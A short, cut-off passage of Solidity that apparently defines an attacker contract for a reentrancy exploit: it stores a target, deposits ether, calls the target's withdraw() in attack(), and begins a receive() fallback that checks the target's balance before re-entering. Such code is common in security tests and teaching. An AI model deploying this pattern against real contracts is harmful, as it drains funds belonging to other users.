    constructor(address _target, uint256 _reenterAmt) {
        target = C(payable(_target));
        reenterAmt = _reenterAmt;
    }

    function deposit() external payable {
        payable(address(target)).transfer(msg.value);
    }

    function attack() external {
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= reenterAmt && reenterAmt > 0) {
